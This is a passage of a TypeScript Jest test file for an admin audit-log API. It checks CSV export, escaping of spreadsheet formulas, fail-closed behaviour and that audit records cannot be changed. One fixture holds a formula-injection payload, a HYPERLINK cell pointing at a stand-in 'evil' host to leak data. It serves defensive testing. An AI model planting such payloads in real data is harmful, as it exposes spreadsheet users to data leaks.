      .get(`${ADMIN_AUDIT}/export`)
      .set('Authorization', `Bearer ${token}`)
      .query({
        action: 'test.capoverflow',
        dateFrom: '2024-05-20T00:00:00Z',
        dateTo: '2024-06-15T00:00:00Z',
      })
      .expect(400);
  });

  it('CSV neutralises a formula-injection user_agent (#1 BLOCKER) and leaves a normal UA alone', async () => {
    const admin = await seedAdmin(h);
    const token = await login(h, admin.email, admin.password);

    // Attacker-controlled UA beginning with '=' (the HYPERLINK attack), plus a
    // benign control row with a normal UA.
    const evilUa = '=HYPERLINK("http://evil/?leak","x")';
    await h.client`
      insert into audit_log (id, tenant_id, actor_type, action, resource_type, user_agent, created_at)
      values (gen_random_uuid(), ${admin.tenantId}, 'anonymous', 'test.csvinject', 'auth',
              ${evilUa}, now())
    `;
    await h.client`
      insert into audit_log (id, tenant_id, actor_type, action, resource_type, user_agent, created_at)
      values (gen_random_uuid(), ${admin.tenantId}, 'anonymous', 'test.csvinject', 'auth',
              ${'Mozilla/5.0 normal'}, now())
    `;

    const res = await request(h.http())
      .get(`${ADMIN_AUDIT}/export`)
      .set('Authorization', `Bearer ${token}`)
      .query({ action: 'test.csvinject', dateFrom: new Date(Date.now() - 86400000).toISOString() })
      .expect(200);

    const csv = res.text;
    // The dangerous cell must be neutralised: the raw `=HYPERLINK` must never
    // appear as a cell-leading token — it must be prefixed with a single quote.
    expect(csv).toContain(`'=HYPERLINK`);
    expect(csv).not.toContain(`,=HYPERLINK`); // not sitting bare after a comma
    expect(csv).not.toMatch(/(^|\r\n)=HYPERLINK/); // not bare at a line start
    // The normal UA is untouched (no spurious leading quote).
    expect(csv).toContain('Mozilla/5.0 normal');
    expect(csv).not.toContain(`'Mozilla/5.0 normal`);
  });

  it('export FAILS CLOSED when its own audit write fails — no CSV served (#7)', async () => {
    const admin = await seedAdmin(h);
    const token = await login(h, admin.email, admin.password);
    await seedExportRow(admin.tenantId, {});

    // Force the export self-audit write (recordOrThrow) to throw by stubbing it.
    const auditService = h.app.get(AuditService, { strict: false });
    const spy = jest
      .spyOn(auditService, 'recordOrThrow')
      .mockRejectedValueOnce(new Error('simulated audit-write outage'));

    try {
      const res = await request(h.http())
        .get(`${ADMIN_AUDIT}/export`)
        .set('Authorization', `Bearer ${token}`)
        .query({ dateFrom: new Date(Date.now() - 86400000).toISOString() });

      // No CSV may leave without its audit row → the request 500s, body is not CSV.
      expect(res.status).toBeGreaterThanOrEqual(500);
      expect(res.headers['content-type'] ?? '').not.toMatch(/text\/csv/);
    } finally {
      spy.mockRestore();
    }
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// A10-M  Immutability
// ═════════════════════════════════════════════════════════════════════════════

describe('A10-M  Audit log immutability', () => {
  let h: AuthHarness;

  beforeAll(async () => {
    h = await bootAuthApp();
  });
  afterAll(async () => await teardownAuthApp(h));
  beforeEach(async () => {
    await resetAuthState(h);
  });

  it('PATCH /admin/v1/audit-log/:id is not defined (404 or 405)', async () => {
    const admin = await seedAdmin(h);
    const token = await login(h, admin.email, admin.password);
    const fakeId = newId();

    const res = await request(h.http())
      .patch(`${ADMIN_AUDIT}/${fakeId}`)
      .set('Authorization', `Bearer ${token}`)
      .send({ action: 'tampered' });

    // Route does not exist → 404 or 405 (NestJS returns 404 for unknown routes).
    expect([404, 405]).toContain(res.status);
  });

  it('DELETE /admin/v1/audit-log/:id is not defined (404 or 405)', async () => {
    const admin = await seedAdmin(h);
    const token = await login(h, admin.email, admin.password);
    const fakeId = newId();

    const res = await request(h.http())
      .delete(`${ADMIN_AUDIT}/${fakeId}`)
      .set('Authorization', `Bearer ${token}`);

    expect([404, 405]).toContain(res.status);
  });
});
